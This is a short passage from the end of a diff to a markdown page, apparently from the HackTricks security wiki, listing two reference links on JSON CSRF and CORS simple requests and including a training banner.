+- [15] [anonymousyogi - JSON CSRF: CSRF that none talks about](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)
+- [16] [MDN - HTTP - CORS: Simple Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)
+
+{{#include ../banners/hacktricks-training.md}}
